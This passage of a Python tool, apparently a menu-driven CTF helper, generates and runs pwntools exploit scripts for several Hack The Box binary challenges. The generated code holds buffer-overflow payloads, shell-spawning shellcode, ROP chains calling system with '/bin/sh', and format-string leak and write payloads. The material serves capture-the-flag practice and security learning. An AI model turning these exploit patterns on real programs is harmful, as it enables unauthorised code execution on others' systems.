            command("echo 'system    = p64(" + REG2[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'jumpto    = p64(" + REG2[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'overwrite = p64(" + REG2[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'memory    = p64(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'pointer   = p64(" + REG2[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'unset_1   = p64(" + REG2[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'unset_2   = p64(" + REG2[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
            command("echo 'unset_3   = p64(" + REG2[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'puts_plt  = p64(" + REG2[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'puts_got  = p64(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'pop_rdi   = p64(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'libc_addr = p64(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py")          
         if DATA[5][:2] == "32":
            command("echo 'eax_addr  = p32(" + REG1[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'ebx_addr  = p32(" + REG1[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'ecx_addr  = p32(" + REG1[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'edx_addr  = p32(" + REG1[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'esi_addr  = p32(" + REG1[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'edi_addr  = p32(" + REG1[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'esp_addr  = p32(" + REG1[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
            command("echo 'ebp_addr  = p32(" + REG1[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'eip_addr  = p32(" + REG1[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'pie       = p32(" + REG1[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'start     = p32(" + REG1[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'main      = p32(" + REG1[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")       
            command("echo 'system    = p32(" + REG2[0].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'jumpto    = p32(" + REG2[1].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'overwrite = p32(" + REG2[2].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'memory    = p32(" + REG2[3].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'unset_2   = p32(" + REG2[4].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'unset_3   = p32(" + REG2[5].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'unset_4   = p32(" + REG2[6].rstrip(" ") + ")' >> " + localDir + "/exploit.py")         
            command("echo 'unset_5   = p32(" + REG2[7].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'puts_plt  = p32(" + REG2[8].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'puts_got  = p32(" + REG2[9].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'pop_rdi   = p32(" + REG2[10].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo 'libc_addr = p32(" + REG2[11].rstrip(" ") + ")' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py")         
         if CSEC[9][:1] == " ":
            command("echo 'offset     = " + CSEC[6].rstrip(" ") + "' >> " + localDir + "/exploit.py")
         else:
            command("echo 'offset     = " + CSEC[9].rstrip(" ") + "' >> " + localDir + "/exploit.py")         
         command("echo 'padding    = \"a\" * offset' >> " + localDir + "/exploit.py")
         command("echo 'terminater = \"\\\\n\"' >> " + localDir + "/exploit.py")         
         command("echo '' >> " + localDir + "/exploit.py")         
        
# HTB EXPLOITS
              
         if DATA[0][:6] == "jeeves":
            command("echo 'payload = flat(padding,overwrite,terminater)' >> "  + localDir + "/exploit.py")
            command("echo '# print(payload)' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py") # SPACER       
            
         if DATA[0][:11] == "batcomputer":
            command("echo 's.recvuntil(\">\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendline(\"1\")' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py") # SPACER
            command("echo 'leak_address = s.recvline().split()[-1]' >> " + localDir + "/exploit.py")
            command("echo 'leak_address = int(leak_address,16)' >> " + localDir + "/exploit.py")
            command("echo 'shellcode = asm(shellcraft.popad() + shellcraft.sh()) # Pop space  ' >> " + localDir + "/exploit.py")
            command("echo 'padding = b\"a\" * (offset - len(shellcode))            # Adjust size' >> " + localDir + "/exploit.py")
            command("echo 'payload = flat(shellcode,padding,leak_address)        # Payload    ' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py") # SPACER
            command("echo 's.recvuntil(\">\")' >> " + localDir + "/exploit.py")
            command("echo 's.send(\"2\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendline(\"b4tp@$$w0rd!\")' >> " + localDir + "/exploit.py")
            command("echo 's.recvline()' >> " + localDir + "/exploit.py")   
            command("echo '' >> " + localDir + "/exploit.py") # SPACER
            
         if DATA[0][:10] == "optimistic":
            command("echo 's.sendlineafter(\":\", \"y\")' >> " + localDir + "/exploit.py")
            command("echo 'rbp_addr = int(re.search(r\"(0x[\w\d]+)\", s.recvlineS()).group(0), 16)' >> " + localDir + "/exploit.py")
            command("echo 'rbp_addr -= 96 # point at RSP instead of RBP' >> " + localDir + "/exploit.py")
            command("echo 'shellcode = \"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V\"' >> " + localDir + "/exploit.py")
            command("echo 'payload = flat([shellcode, cyclic(offset - len(shellcode)), rbp_addr])' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py") # SPACER  
            command("echo 's.sendlineafter(\"Email:\", \"420\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendlineafter(\"Age:\", \"1337\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendlineafter(\"Length of name:\", \"-1\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendlineafter(\"Name:\", payload)' >> " + localDir + "/exploit.py")
            command("echo 's.interactive()'  >> " + localDir + "/exploit.py")
            command("echo 'exit()'  >> " + localDir + "/exploit.py")                         
            
         if DATA[0][:3] == "reg":
            command("echo 'payload = flat(padding,jumpto,terminater)' >> " + localDir + "/exploit.py")
            command("echo '# print(payload)' >> " + localDir + "/exploit.py")         
            command("echo '' >> " + localDir + "/exploit.py") # SPACER                
              
         if DATA[0][:11] == "htb-console":
            command("echo 'payload = flat(padding,pop_rdi,memory,system,terminater)' >> "  + localDir + "/exploit.py")
            command("echo '# print(payload)' >> " + localDir + "/exploit.py") 
            command("echo '' >> " + localDir + "/exploit.py") # SPACER 
            command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendline(\"hof\")' >> " + localDir + "/exploit.py")
            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendline(\"/bin/sh\")' >> " + localDir + "/exploit.py")
            command("echo 's.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendline(\"flag\")' >> " + localDir + "/exploit.py")
            command("echo 's.recvuntil(\":\")' >> " + localDir + "/exploit.py")
            
         if DATA[0][:9] == "leet_test":
            command("echo '#for i in range(100):' >> " + localDir + "/exploit.py")
            command("echo '#   try:' >> " + localDir + "/exploit.py")
            command("echo '#      s.sendline(\"%{}$x\".format(i))' >> " + localDir + "/exploit.py")
            command("echo '#      s.recvuntil(\"Hello,\")' >> " + localDir + "/exploit.py")
            command("echo '#      result = s.recvline()' >> " + localDir + "/exploit.py")
            command("echo '#      print(str(i) + \": \" + str(result))' >> " + localDir + "/exploit.py")
            command("echo '#   except EOFError:' >> " + localDir + "/exploit.py")
            command("echo '#      pass' >> " + localDir + "/exploit.py")
            command("echo '# exit(1)' >> " + localDir + "/exploit.py")            
            command("echo '' >> " + localDir + "/exploit.py") # SPACER              
            command("echo 's.sendline(\"%{}$p\".format(38))' >> " + localDir + "/exploit.py")
            command("echo 's.recvuntil(\"Hello,\")' >> " + localDir + "/exploit.py")
            command("echo 'leaked_addr = int(s.recvlineS().strip(), 16)' >> " + localDir + "/exploit.py")
            command("echo 'info(\"leaked_addr = 0x%x (%d)\", leaked_addr, leaked_addr)' >> " + localDir + "/exploit.py")
            command("echo 'random_num_addr = leaked_addr - 0x11f' >> " + localDir + "/exploit.py")
            command("echo 'payload = flat([\"%12$lln\", \"%13$llnaa\", pack(0x404078), pack(random_num_addr)])' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py") # SPACER      
                          
         if DATA[0][:10] == "blacksmith":
            command("echo 'shellcode  = asm(shellcraft.open(\"flag.txt\"))' >> "  + localDir + "/exploit.py")
            command("echo 'shellcode += asm(shellcraft.read(3, \"rsp\", 0x100)) # read to rsp' >> "  + localDir + "/exploit.py")
            command("echo 'shellcode += asm(shellcraft.write(1, \"rsp\", \"rax\"))  # write rsp  ' >> "  + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py") # SPACER            		
            command("echo 's.sendlineafter(\">\", \"1\")' >> " + localDir + "/exploit.py")
            command("echo 's.sendlineafter(\">\", \"2\")' >> " + localDir + "/exploit.py")           
            command("echo 's.sendlineafter(\">\", flat(shellcode))' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py") # SPACER 
            command("echo 's.recv()' >> " + localDir + "/exploit.py")
            command("echo 'flag = s.recv()' >> " + localDir + "/exploit.py")
            command("echo 'print(terminater, flag)' >> " + localDir + "/exploit.py")
            command("echo 'exit(1)' >> " + localDir + "/exploit.py")
            command("echo '' >> " + localDir + "/exploit.py") # SPACER                          
            
# ADD YOUR BESPOKE PAYLOADS HERE     
         command("echo 'try:' >> " + localDir + "/exploit.py")
         command("echo '   s.send(payload)' >> " + localDir + "/exploit.py")
         command("echo '   s.interactive()' >> " + localDir + "/exploit.py")
         command("echo 'except:' >> " + localDir + "/exploit.py")
         command("echo '   s.close()' >> " + localDir + "/exploit.py")         
         print(colored("[*] Python exploit template sucessfully created...", colour3))
         catsFile(localDir + "/exploit.py")
         os.chdir(localDir)
         command("echo 'PWNED!!' > flag.txt")  
         os.system("python3 exploit.py")
         os.chdir("..")
      prompt()                       

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - View instruction manual.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '59':
      print(colored("[*] Starting web-browser...", colour3))
      webbrowser.get("firefox").open("https://docs.pwntools.com/en/latest/", new=2)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Terminate program.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '60':        
      saveParams()
      command("rm *.tmp")    
      connection.close()
      print(colored("[*] Program sucessfully terminated...", colour3))
      exit(1)  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Menu option selected - Display copyright 2021
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '100':
      dispBanner("BINARY MASTER",1)
      print(colored("    C O P Y R I G H T  2 0 2 1  -  T E R E N C E  B R O A D B E N T",colour7,attrs=['bold']))
      print("\n----------------------------------------------------------------------------")     
      prompt()      
# Eof...
